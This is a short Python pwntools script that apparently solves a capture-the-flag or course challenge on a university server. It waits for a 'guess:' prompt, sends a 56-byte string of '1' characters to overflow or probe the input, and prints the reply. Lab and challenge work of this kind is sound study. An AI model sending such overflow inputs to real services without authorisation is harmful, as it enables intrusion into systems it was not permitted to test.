from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23161

s = remote(SERVER, PORT, timeout=9999)

s.recvuntil(b'guess:')
s.sendline(b'1'*56)
response = s.recvline()

print(response.decode())
